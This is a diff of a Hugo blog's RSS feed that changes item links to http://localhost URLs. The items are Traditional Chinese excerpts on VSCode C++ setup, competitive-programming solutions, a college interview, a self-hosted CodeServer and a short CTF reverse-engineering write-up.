+      <link>http://localhost:1313/posts/2022/vscode_cpp_setup/</link>
       <pubDate>Sun, 11 Sep 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/vscode_cpp_setup/</guid>
+      <guid>http://localhost:1313/posts/2022/vscode_cpp_setup/</guid>
       <description>遇到很多來問我VSC怎麼設定C/C++的問題，這裡直接寫篇文來說明我的作法。&#xA;前置 環境(以撰寫此篇文時的環境為主)： Windows 11(64 bit) 22H2 Visual Studio Code 1.71 7-Zip 目標 配置GCC 12 MinGW-w64 不含Clang 之編譯器 成功在VSCode裡編譯並執行一支C/C++程式 過程 一、安裝延伸模組： C/C++、Code Runner 二、下載編譯器：範例為GCC 12.2.0 + MinGW-w64 10.0.0 without Clang 請到這個網站&#xA;下載編譯器(視個人需求選擇一種編譯器)，並解壓到任意空間，(ex: C:/)&#xA;三、設定環境變數 Windows設定 -&amp;gt; 系統 -&amp;gt; 裝置規格 -&amp;gt; 進階系統設定 -&amp;gt; 環境變數 -&amp;gt; 系統變數(使用者環境變數)&#xA;在變數名 Path 中添加路徑(剛剛解壓到的路徑/bin/)&#xA;完成後打開cmd(命令提示字元)或Terminal，輸入 gcc -v，如果成功的話就會在最後一行看到 gcc version 12.1.0 字樣。&#xA;四、設定VSCode 打開VSCode，點擊左下角齒輪，然後找到右上角功能欄中的 開啟設定(JSON)，在最外面的{}裡貼上以下範例設定&#xA;1 2 3 4 5 6 7 &amp;#34;code-runner.executorMap&amp;#34;:{ &amp;#34;c&amp;#34;: &amp;#34;cd $dir &amp;amp;&amp;amp; gcc $fileName -o $fileNameWithoutExt &amp;amp;&amp;amp; $dir$fileNameWithoutExt&amp;#34;, &amp;#34;cpp&amp;#34;: &amp;#34;cd $dir &amp;amp;&amp;amp; g++ -std=c++11 -O2 $fileName -o $fileNameWithoutExt &amp;amp;&amp;amp; $dir$fileNameWithoutExt&amp;#34; }, // 編譯並執行指令，其中設定項 -std= 後面可接C++版本 (98,11,14,17,20,.</description>
     </item>
     <item>
       <title>大學面試心得</title>
-      <link>//localhost:1313/posts/2022/college_interview/</link>
+      <link>http://localhost:1313/posts/2022/college_interview/</link>
       <pubDate>Fri, 20 May 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/college_interview/</guid>
+      <guid>http://localhost:1313/posts/2022/college_interview/</guid>
       <description>申請入學(新課綱第一屆白老鼠) 身為2003/9月出生的我，變成教育部爆改課綱的頭一批白老鼠orz&amp;hellip;，可謂生於SARS，死於武漢！&#xA;以為今年數學會比110簡單，結果更難😠，我的學測直接燒到只剩43級分。&#xA;聽到這成績後我還是硬著頭皮把六個志願全都填電資/資工，&#xA;以下是我的一階正取校系以及二階面試狀況(20220530更新: 穩到不行欸好讚)：&#xA;中原資工 - 疫情取消面試 - 備14 中原資電不分系 - 疫情取消面試 -正8 逢甲資電不分系 - 521面試結束 - 正30 元智資工 - 無面試 - 正76 東海資工 - 522面試結束 - 正3 哭啊只剩兩間面試，飯店都訂好了，直接噴掉1000&#xA;面試過程 逢甲資電不分系: 印象不錯，有熱情的學長姊(?，進去前會一直跟我們聊天(降低緊張感？&#xA;而且教授非常友善、和藹(幸運遇到白臉)~ 聽說另一間試場是黑臉教授&#xA;面試方式是一次六個人對三位教授，大概是這樣坐的：&#xA;教授 教授 教授&#xA;------長桌------&#xA;1(沒來) 2 3 4 5 我(6) 門&#xA;一開始教授讓我們輪流自我介紹，&#xA;而當右邊的教授聽到我參加APCS跟能競就問學過什麼語言，然後從我開始倒序輪流回答(我忘了講資奧初選被旁邊講走orz&amp;hellip;。&#xA;接著教授就問還有什麼問題&#xA;我問了有關往國外發展的條件，然後其他人也都問一問時間就到了。&#xA;整場就像是跟教授在聊天而已，真的不用太緊張，&#xA;第一天面試感覺非常好，希望第二天東海也能順利~&#xA;東海資工資電組: 一人對三個教授，而且也非常友善不用緊張&#xA;首先自我介紹，然後&#xA;教授(簡稱P): 你的經歷滿豐富的，分享一件你印象深刻的歷程跟收穫&#xA;我說了Farmbot(點我查看)的事&#xA;P: 你APCS考得不錯為什麼不填APCS組&#xA;我: 我認為APCS就是測驗自己的程式能力，沒有把他當我的入學管道&#xA;P: 我覺得你備審用Linux介面當封面的想法很有創意，而且你也有提到之前參加我們學校的AI營隊&amp;hellip;&#xA;^當事封面&#xA;P: 你還有報哪些科系，如果都上會選哪間&#xA;我回答比較保守，把每間優點都講出來後說再考慮</description>
     </item>
     <item>
       <title>【TIOJ】1903-你的笑容由我來守護-EXTREME</title>
-      <link>//localhost:1313/posts/2022/tioj1903/</link>
+      <link>http://localhost:1313/posts/2022/tioj1903/</link>
       <pubDate>Fri, 13 May 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/tioj1903/</guid>
+      <guid>http://localhost:1313/posts/2022/tioj1903/</guid>
       <description>題目： 給一張$N$個點的無向圖，一開始有$M$條邊。 接著$Q$個操作，有以下兩種：&#xA;增加一條連著$A_i$、$B_i$的邊。 刪除一條連著$A_i$、$B_i$的邊(保證這條邊存在)。 每次操作完後輸出當前連通塊數量。&#xA;$1 \le N \le 5e5$ $M+Q \le 5e5$ $0 \le A_i,B_i \le N-1$ $A_i \neq B_i$ 輸入： 第一行有一個數字T代表測資筆數。&#xA;每筆測資第1行有3個整數N、M、Q。&#xA;接下來M行每行兩個整數Ai、Bi，代表Ai和Bi這兩個人目標相同。&#xA;接下來Q行，每行有一個字元 c 和兩個整數Ai、Bi，代表修改一個紀錄。&#xA;如果 c 是 N，代表增加一筆 Ai、Bi 兩人目標相同的紀錄；&#xA;如果 c 是 D，代表要刪除一筆 Ai、Bi 目標相同的紀錄，所有刪除都是合法的。&#xA;輸出： 對於每筆測資的Q筆修改，每次修改完輸出一行代表連通塊數量。&#xA;Ex 1 Input: 2&#xD;3 0 3&#xD;N 0 1&#xD;N 1 2&#xD;N 2 1&#xD;3 3 3&#xD;0 1&#xD;1 2&#xD;2 1&#xD;D 2 1&#xD;D 0 1&#xD;D 2 1 Ex 1 Output: 2&#xD;1&#xD;1&#xD;1&#xD;2&#xD;3 題解： 動態維護連通塊數量可以使用並查集(DSU)，但多了刪除的操作。</description>
     </item>
     <item>
       <title>【CTF-WriteUp】EasyCTF-adder</title>
-      <link>//localhost:1313/posts/2022/ctf_easyctf_adder/</link>
+      <link>http://localhost:1313/posts/2022/ctf_easyctf_adder/</link>
       <pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/ctf_easyctf_adder/</guid>
+      <guid>http://localhost:1313/posts/2022/ctf_easyctf_adder/</guid>
       <description>題目：&#xA;給你一個加法程式，找出Flag&#xD;adder&#xA;概念： 反編譯 題解 在linux執行程式，看到要你輸入三個數，先隨意輸入，發現輸出nope。&#xA;開啟反編譯工具Ghidra對檔案反編譯，發現在main函式中的flag前綴，&#xA;而只要讓該行上面的if條件成立應該就能得到flag，顯然我們只要輸入三個數讓他加起來等於 0x539 即可。&#xA;透過簡單的進位換算，得$539_{16}\ =\ 1337_{10}$&#xA;開啟程式輸入1337 0 0 就可以拿到flag了~</description>
     </item>
     <item>
       <title>網站搬家~</title>
-      <link>//localhost:1313/posts/2022/newborn/</link>
+      <link>http://localhost:1313/posts/2022/newborn/</link>
       <pubDate>Wed, 16 Feb 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/newborn/</guid>
+      <guid>http://localhost:1313/posts/2022/newborn/</guid>
       <description>我把網站從Jekyll改到Hugo了 因為111學測已經很久沒更新了，今天終於把網站搬遷成功，整個網站比以前看起來更舒服~&#xA;Hugo比起Jekyll更容易客製化，可以使用更多插件，之後有空就把留言系統加一加ㄅ~~</description>
     </item>
     <item>
       <title>自架CodeServer，實現隨時隨地都能寫程式</title>
-      <link>//localhost:1313/posts/2022/codeserver/</link>
+      <link>http://localhost:1313/posts/2022/codeserver/</link>
       <pubDate>Wed, 16 Feb 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/codeserver/</guid>
+      <guid>http://localhost:1313/posts/2022/codeserver/</guid>
       <description>最近架了一台CodeServer，那是一個具有VSCode的伺服器平台，要他支援什麼語言照著一般設定VSC2方式就行~&#xA;先備條件： 會用Windows跟Ubuntu Docker以及容器的基礎操作 參考資源： codercom/Code-server&#xA;本文所用配備及版本： 物理機環境： Windows 11 Pro 21H2 Code Server版本： v4.0.2 步驟 (這裡省略前面Docker的安裝步驟)&#xA;先開一個資料夾名為CodeServer，這是伺服器的根目錄 新增一個檔案，檔名為docker-compose.yml 編輯檔案，貼上這些： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: &amp;#34;2.1&amp;#34; services: code-server: image: codercom/code-server container_name: code-server environment: - TZ=ASIA/TAIPEI - PASSWORD=&amp;lt;設定進入伺服器的密碼&amp;gt; - SUDO_PASSWORD=&amp;lt;設定Root權限的密碼&amp;gt; volumes: - ./appdata/code-server/project:/home/coder/project - ./appdata/code-server/.local:/home/coder/.local ports: - &amp;lt;PORT&amp;gt;:8080 restart: always (1) version: 不用動他&#xA;(2) image: 指定目標映像，Docker會試著到上面給的網站找尋映像檔&#xA;(3) container_name: 給容器隨便取一個名字&#xA;(4) TZ: Timezone時區</description>
     </item>
     <item>
       <title>區間詢問比K小的數量</title>
-      <link>//localhost:1313/posts/2021/mergesorttree/</link>
+      <link>http://localhost:1313/posts/2021/mergesorttree/</link>
       <pubDate>Sat, 25 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mergesorttree/</guid>
+      <guid>http://localhost:1313/posts/2021/mergesorttree/</guid>
       <description>今天是資訊能競校內初選，沒把經典題做出來真的很可惜。&#xA;所以來刻點線段樹緩下心情(?&#xA;順便測試一下在網站中使用 $ \LaTeX $&#xA;先要基礎： 線段樹、二分搜、排序&#xA;合併排序樹 合併排序樹是一種線段樹，節點上都是一個向量(Vector)， 比如節點的範圍是[l,r]，則節點上向量就是已排序過的array[l~r]。 題目： 輸入 $n$ 個數到陣列 $A$，然後輸入一個 $q$ 代表詢問次數。&#xA;接著每次詢問有三個數 $l,r,k$ 代表詢問的區間$[l,r]$ 有幾個數比 $k$ 小。&#xA;其中，$ 1 \le n,q \le 2*10^5$，且陣列中沒有重複數字。&#xA;輸入： 首先輸入一整數 $n$，&#xA;再來一行有$n$個數代表 $a_i(1 \le a_i \le 10^9)$。&#xA;接下來一行輸入整數$q$，&#xA;接著有 $q$ 行分別輸入 $l,r,k$。&#xA;輸出： 一個整數代表在 $[l,r]$ 區間內有幾個數比 $k$ 小。&#xA;Ex 1 Input: 10&#xD;5 2 1 9 10 4 8 7 6 3&#xD;5&#xD;1 10 6&#xD;4 8 7&#xD;6 9 4&#xD;1 8 5&#xD;2 7 10&#xD;Ex 1 Output: 5&#xD;1&#xD;0&#xD;3&#xD;5&#xD;Note: 第一個詢問區間 $[1,10]，k=6$，其中比k小的元素有:$ {5,2,1,4,3} $，共$5$個。</description>
     </item>
     <item>
       <title>103年彰雲嘉P5 - Infix to Postfix</title>
-      <link>//localhost:1313/posts/2021/mtwcp103_5/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp103_5/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp103_5/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp103_5/</guid>
       <description>題目： 一般我們在表示運算式時，是使用中序式，是將運算子放在兩運算元中間， 比如 (A+B)*(C+D)。而在電腦中，需要將中序式轉成後序式以方便運算。 (A+B)*(C+D)的後序式為 AB+CD+*； A*(B+C)-D*E+F 的後序式為 ABC+*DE*-F+ 。 請寫一程式將中序式轉成後序式。&#xD;輸入： 輸入一個中序運算式，其中運算元為A~Z等26個單一字母表示，運算子只包含+、-、*、/。 運算式中可有任意多個括號，且保證輸入的式子合法。&#xD;輸出： 輸出後序式。&#xD;Ex 1 Input: 中置式: (A+B*(C-D)+E)* ((F+G)/(H*I)+J) Ex 1 Output: 後置式: ABCD-*+E+FG+HI*/J+*&#xD;題解： 需要注意的是四則運算的優先序(括號先算，由左到右，先乘除，後加減)。&#xA;這題是非常經典的堆疊資料結構應用題，用 getline 輸入，遇到運算子就加入堆疊，&#xA;先看括號，然後看加減乘除，如果遇到 ) 的話，就把堆疊的運算子都輸出直到碰到 ( 為止。&#xA;而運算元則直接輸出就行。&#xA;(我的編譯器因為格式問題輸出不了中文&amp;hellip;反正程式碼對就好)&#xA;這問題可以再延伸，比如以中序式進行四則運算輸出結果，&#xA;跟這題做法很像只要把中序轉成後序然後讀一遍，&#xA;遇到運算子就把前面讀到的數字做運算後放入堆疊，注意運算子可能有多位數。&#xA;補充：這種需要stack的題目通常能用遞迴完成，因為遞迴本身就是一種堆疊。&#xA;上程式碼：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 #pragma GCC optimize(&amp;#34;Ofast&amp;#34;) #pragma loop_opt(on) #include&amp;lt;bits/stdc++.</description>
     </item>
     <item>
       <title>107年彰雲嘉p3 - GCD &amp; LCM</title>
-      <link>//localhost:1313/posts/2021/mtwcp107_3/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp107_3/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp107_3/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp107_3/</guid>
       <description>題目： 給你一堆數字(&amp;gt;=0)，求他們的GCD(最大公因數)與LCM(最小公倍數)&#xD;輸入： 一堆數字以空格分開，最後以0結束&#xD;輸出： 所有數字(除了0以外)的GCD跟LCM，以空格分開&#xD;Ex 1 Input: 10 20 30 0&#xD;Ex 2 Input: 3 5 7 9 12 0&#xD;Ex 3 Input: 100 100 200 0&#xD;Ex 1 Output: 10 60&#xD;Ex 2 Output: 1 1260&#xD;Ex 3 Output: 100 200&#xD;題解： 就是一題簡單的數論題，&#x9;可以根據歐幾里得算法 gcd(a,b-a) = gcd(a,b mod a), gcd(a,0) = |a| (輾轉相除)來求GCD，&#x9;那LCM要怎麼求？我們知道 a | (a*b) 且 b | (a*b) (a*b必為ab公倍數)&#x9;如果要得到最小公倍數，只要除以gcd(a,b)就行。&#xA;當我們在計算mod時，要注意有沒有負數問題，因為C++的算法會使負數模運算出差錯，&#x9;建議使用((a%b)+b)%b 來取代 a%b，這樣就能簡單避開負數取模的問題了。&#x9;還好這題輸入並沒有負數，但之後做模運算時請稍加注意。</description>
     </item>
     <item>
       <title>107年彰雲嘉P6 - 統一發票對獎程式</title>
-      <link>//localhost:1313/posts/2021/mtwcp107_6/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp107_6/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp107_6/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp107_6/</guid>
       <description>題目： Ex 1 Input: 73372972&#xD;22315462&#xD;91903003&#xD;16228722&#xD;03270598&#xD;163&#xD;983&#xD;814&#xD;73372971&#xD;22315461&#xD;91903001&#xD;16228722&#xD;13210598&#xD;03210163&#xD;0&#xD;Ex 1 Output: 201200&#xD;題解： 前三個獎直接判別，後面判別如果你用int，就 mod pow(10,i)；&#xA;如果你用字串，直接複製 string s1(s.begin()+i,s.end())。&#xA;這裡使用字串判別。&#xA;判定順序可以任意，總之記得符合條件就一定要break不然會多算。&#xA;增開六獎跟持有號碼數量雖然不一定，但他們長度都是固定的，&#xA;string直接s.size()，而int你可以透過除以1000 == 0? 判別。&#xA;這裡直接把六獎當增開六獎判定，反正結果一樣。&#xA;官方測資的獎金不會超過$2^{31}$，所以不會溢位。&#xA;上程式碼：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #pragma GCC optimize(&amp;#34;Ofast&amp;#34;) #pragma loop_opt(on) #include&amp;lt;bits/stdc++.</description>
     </item>
     <item>
       <title>108年彰雲嘉上午P5 - 魔術三角形</title>
-      <link>//localhost:1313/posts/2021/mtwcp108_1_5/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp108_1_5/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp108_1_5/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp108_1_5/</guid>
       <description>題目： 魔術三角形是一個由1到9的數字所形成之三角形， 每邊由4個數字組成，邊與邊之間會有1個數字共用，而且每個邊 4個數字相加之總和是一樣的，舉例來說，下圖是一個魔術三角形，三個邊的數字和均為19。 我們以三角形最上面的數字7為起點，順時針方向列出所有9個數字來表示這個三角形， 表示為&amp;quot;781359264&amp;quot; (取自108年彰雲嘉資訊科能力競試上午場P5)&#xA;預先將下圖的三個藍色粗框部分填入數字，請填入其餘數字使其成為一個魔術三角形。&#xD;(取自108年彰雲嘉資訊科能力競試上午場P5)&#xA;輸入： 三個1~9之間的數代表依順時針填入藍色粗框的3個數字。&#xD;輸出： 將形成的魔術三角形之9個數字合併成一個十進位數字輸出，若存在多個答案 ，則輸出十進位數字最小者。若無法形成魔術三角形，則輸出1個0。&#xD;Ex 1 Input: 4 3 6&#xD;Ex 2 Input: 4 6 7&#xD;Ex 1 Output: 542937168&#xD;Ex 2 Output: 249561873&#xD;題解： 題目沒給時間限制，當然直接暴力做下去啊！&#xA;時間複雜度也只有O(6!) = O(720)，&#xA;所以也不會超過1秒&#xA;可使用next_permutation()這個函式，&#xA;他是用來枚舉排列的工具，既然是排列，&#xA;有學過排列組合都知道不重複排列數是P(n,n)&#xA;那時間複雜度就會是O(P(n,n))=O(n!)&#xA;如果遇到排列數很多的就還是別用了吧&#xA;記得在用這個函式時要先把要排的數組先排序好，&#xA;才能完整枚舉所有排列。&#xA;上程式碼：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 #pragma GCC optimize(&amp;#34;Ofast&amp;#34;) #pragma loop_opt(on) #include&amp;lt;bits/stdc++.</description>
     </item>
     <item>
       <title>108年彰雲嘉上午P6 - Knight Moves</title>
-      <link>//localhost:1313/posts/2021/mtwcp108_1_6/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp108_1_6/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp108_1_6/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp108_1_6/</guid>
       <description>題目： 西洋棋騎士/象棋的馬每步可以沿日字對角走到另一對角， 現在有一個X*Y的棋盤，左下角座標(0,0)，右下為(X-1,0) 棋子的起始點為(a,b)，請求出走到(c,d)的最小步數。&#xD;其中X,Y&amp;lt;=10000&#xD;輸入： 本題有多筆測資，第一行輸入N代表有幾筆測資 接下來每筆測資有一行， 依序以空格分開輸入6個正整數X, Y, a, b, c, d 輸出： 針對每筆測資依序輸出最短步數&#xD;Ex 1 Input: 2 10 10 3 4 7 6 10 10 3 4 9 9 Ex 1 Output: 2 5&#xD;題解： 如果還是不懂騎士走法可參考 維基百科&#xA;這題是非常經典的最短路問題，可使用BFS(廣度優先搜尋)解。&#xA;可以想像有一個確診武漢肺炎的同學坐在班上位置中間，&#xA;而病毒就從那位同學開始往旁邊擴散，&#xA;每過一天就一個確診，&#xA;最後全班都被感染病毒，&#xA;然後就能求哪位同學會在第幾天確診。&#xA;其原理是利用佇列(&amp;lt;queue&amp;gt;)，造訪所有圖上的位置，&#xA;並記錄從起點到每個位置一共走了多少步。&#xA;騎士走法是按照日字走的，因此可推論一個點會有八種走法&#xA;而步數就是上一個點的步數再+1&#xA;上程式碼(當然你可以用struct建立點佇列，就不用宣告那麼多queue跟陣列了)：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #pragma GCC optimize(&amp;#34;Ofast&amp;#34;) #pragma loop_opt(on) #include&amp;lt;bits/stdc++.</description>
     </item>
     <item>
       <title>108年彰雲嘉下午P10 - Huffman</title>
-      <link>//localhost:1313/posts/2021/mtwcp108_2_10/</link>
+      <link>http://localhost:1313/posts/2021/mtwcp108_2_10/</link>
       <pubDate>Sat, 11 Sep 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/mtwcp108_2_10/</guid>
+      <guid>http://localhost:1313/posts/2021/mtwcp108_2_10/</guid>
       <description>題目： Huffman ： 維基百科&#xA;霍夫曼樹經常被用來作資料壓縮，將字串資料轉成霍夫曼碼以減少字串資料所佔的空間大小，其詳細作法如下：&#xD;(1)字串中所有的字母元素都放在最底層的葉節點上，節點中的值為此字母的出現次數。&#xD;(2) 每次從尚無父節點的所有節點中，尋找值最小（出現次數最少）的兩個節點來建立霍夫曼樹，&#xD;產生其父節點的值為兩個節點值相加的和。最後只剩下根節點沒有父節點。&#xD;(3) 從根節點開始往下編碼，左分支為 0，右分支為 1，每個葉節點的字母元素會產生一個霍夫&#xD;曼碼（由 0 和 1 所組成），字母元素出現的頻率越高則霍夫曼碼越短。&#xD;我們這題需要計算一個字串轉成霍夫曼碼的壓縮率。假設有個字串&amp;quot;queue&amp;quot;，則此字串會佔5 bytes = 40bits空間，&#xD;轉成霍夫曼碼後應為&amp;quot;00011011&amp;quot;，只需要8個bits就可儲存，因此壓縮率為(40-8)/40 * 100% = 80%。&#xD;輸入： 輸入一列字串(長度最多100字元，且不含空格)。&#xD;輸出： 依序輸出此字串壓縮前的bit數、壓縮後的bit數、壓縮率百分比(格式為⌊n⌋%，即n向下取整)。&#xD;Ex 1 Input: queue&#xD;Ex 2 Input: abadcafcabfdec&#xD;Ex 3 Input: aaaaaaamcmhhhhhmkkkkkkkkmbbmdddddddmyymppppp&#xD;Ex 4 Input: BCBBB&#xD;Ex 1 Output: 40 8 80%&#xD;Ex 2 Output: 112 35 68%&#xD;Ex 3 Output: 352 132 62%&#xD;Ex 4 Output: 40 5 87%&#xD;題解： 題目沒說字串中大小寫是否要算成同一字母，因此先視為不同的來處理。</description>
     </item>
     <item>
       <title>Farmbot歷程</title>
-      <link>//localhost:1313/posts/2021/farmbot/</link>
+      <link>http://localhost:1313/posts/2021/farmbot/</link>
       <pubDate>Thu, 11 Feb 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/farmbot/</guid>
+      <guid>http://localhost:1313/posts/2021/farmbot/</guid>
       <description>Farmbot&#xA;(本頁面在舊版網站發布，會有不少顯示問題)&#xA;FBTUG共筆資料&#xA;什麼是Farmbot? 一個機器人開放式系統，可通過土地種植，澆水，土壤測試和除草為所有需要耕種小土地跟想種糧食的人提供幫助&#xA;使用Raspberry Pi(樹莓派)，Arduino以及其他優良組件&#xA;1.碳足跡 製造 目前看重環保議題,Farmbot使用最普遍的材料:&#xA;材料 用途 重量(kg) kg CO2/物料 kg CO2(kg) 鋁 擠壓板 9.5 8.24 78.3 不鏽鋼 硬件，軸承，驅動軸，絲槓 1.4 6.15 8.6 塑料 拖鏈，3D列印[CAD]，輪子，電子設備，管材，電路板 2.8 2.53 7.1 銅 電，佈線，電動機繞組 0.3 2.60 0.8 橡膠 皮帶，電線，墊片 0.2 3.18 0.6 合計 95.4 每生產Farmbot排放的理論量約 95.4 kg，但實際上較接近 150 kg&#xA;使用 在使用Farmbot時，最明顯的CO2排放源應為用電量，在此使用美國平均每千瓦時所排放的二氧化碳量 (0.554kg/kWh)&#xA;零件 功率(W) 佔空比(%) 使用時間(h/d) kWh/day kWh/year kg CO2/day kg CO2/year 樹莓派2 3.0 100% 24.00 0.072 26.3 0.040 14.56 樹莓派相機 1.</description>
     </item>
     <item>
       <title>Python遊戲設計</title>
-      <link>//localhost:1313/posts/2021/pythongame/</link>
+      <link>http://localhost:1313/posts/2021/pythongame/</link>
       <pubDate>Mon, 11 Jan 2021 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2021/pythongame/</guid>
+      <guid>http://localhost:1313/posts/2021/pythongame/</guid>
       <description>FOR Python遊戲設計 檔案庫: Here&#xA;Python程式列表(全自寫): LIST&#xA;Cocos2d: Docs&#xA;第一堂: IDE: pycharm CE, Module: cocos2d 彭彭-Python程式設計入門&#xA;Colab&#xA;CBE30338&#xA;記得寫程式可放個小抄在旁邊&amp;hellip;&#xA;有問題請點這個&#xA;作業: 遊玩CodeCombat&#xA;第二堂 安裝Pycharm : Pycharm&#xA;Community版為開源,免費 / Professional為完整版(30天免費試用)&#xA;需要先安裝Python (Ver. &amp;gt;3.7),Windows:可在Microsoft市集搜尋Python / MacOS可在官網上下載 / Linux有些版本已預安裝,安裝方式: ($ apt update &amp;amp;&amp;amp; apt install python3)&#xA;安裝方式: Here&#xA;設定: here&#xA;安裝Cocos2d: Files&amp;gt;Setting&amp;gt;Project: Inter..&amp;gt;(+)&amp;gt;搜尋cocos2d&amp;gt;安裝&#xA;學程式的技巧: 先抄再讀 不懂可Google&#xA;Vim: 分為命令模式,插入模式,底線命令模式,視覺模式&#xA;命令模式: 為預設模式,在任何模式中按下Esc即可到此模式,可按下某些鍵來切換模式&#xA;插入模式: 切換方式:在命令模式中按下i,a,o等按鍵,可在游標位置插入需要的文字&#xA;底線命令模式: 切換方式:按下:,可輸入指令操作內容,&#xA;離開: :q&#xA;強制離開: :q!&#xA;存檔不離開: :w&#xA;強制存檔不離開: :w!&#xA;存檔並離開: :wq</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-(補充)巨集</title>
-      <link>//localhost:1313/posts/cpp/cpp-macro/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-macro/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-macro/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-macro/</guid>
       <description> C++筆記-目錄 補充 - 巨集： 有時候，我們不想打那麼多字，為節省時間，可以在前面先定義&#xA;一個巨集： #define&#xA;1 2 3 4 #define int long long //讓所有整數都變成長整數，之後用int宣告的話都會宣告成long long #define pb push_back //把指令縮短，之後要用就打pb就好 我們也可以用巨集來定義函式：&#xA;1 2 #define add(a,b) a+b //定義一個函式，參數為a,b，回傳a+b 有時候如果定義的巨集是變數型態也可以用typedef&#xA;1 2 typedef long long ll //之後宣告long long就打ll就好 定義陣列巨集：&#xA;1 2 3 4 typedef char str[100]; //之後宣告字串就打str就好 str s; // 宣告 char 陣列 </description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-IO</title>
-      <link>//localhost:1313/posts/cpp/cpp-io/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-io/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-io/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-io/</guid>
       <description>C++筆記-目錄 輸入/輸出與流Buffer概念 流 在c++我們需要了解一下流跟緩衝區的概念，&#xA;C++這個語言本來是沒有IO功能的，&#xA;基本的輸入輸出定義於&amp;lt;iostream&amp;gt;與&amp;lt;fstream&amp;gt;這兩個標準模板庫(std)裡，&#xA;它們被分成了三個標準：&#xA;istream/ cin、wcin ： 標準輸入流&#xA;ostream/ cout、wcout ： 標準輸出流&#xA;ostream/ cerr、wcerr ： 標準錯誤輸出流(無緩衝)&#xA;ostream/ clog、wclog ： 標準錯誤輸出流(有緩衝)&#xA;輸入的方式，是使用(&amp;raquo;)從輸入流中擷取資料，而輸出則是用(&amp;laquo;)將資料擷取到輸出流。&#xA;這就是一開始學校在教程式時會說輸入就是 cin &amp;gt;&amp;gt; x;，輸出是 cout &amp;lt;&amp;lt; x;，箭號方向不能交換。&#xA;緩衝區 緩衝區的定義是 用作中介的內存塊，簡單來說，&#xA;它就是先把資料全部移到一個地方(內存)，再去慢慢讀取的概念。&#xA;因為程式只能一個字一個字讀，如果直接讀，程式會變超慢，&#xA;也就是當程式頻繁進行 IO 操作，會頻繁把高速的部分打斷，&#xA;造成性能下降。&#xA;緩衝區的功用就在於避開頻繁操作，只要讀取緩衝區的資料就好。&#xA;只有需要時再刷新緩衝區進行 IO 操作，讓程式性能提升。&#xA;以下狀況會刷新緩衝區：&#xA;使用cin 釋放cout的資源 使用endl、fflush 程式正常結束 關於 IO 優化等操作，可查閱算法筆記&#xA;輸入 在 C++，我們使用 cin(音：西印) 輸入文字，&#xA;方法很簡單，不像 C 語言還要指定型別， cin &amp;gt;&amp;gt; x; 就是輸入資料到x。&#xA;當要輸入多筆資料，只要在後面繼續加就好 cin &amp;gt;&amp;gt; x &amp;gt;&amp;gt; y &amp;gt;&amp;gt; z;。</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-函式與遞迴</title>
-      <link>//localhost:1313/posts/cpp/cpp-function/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-function/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
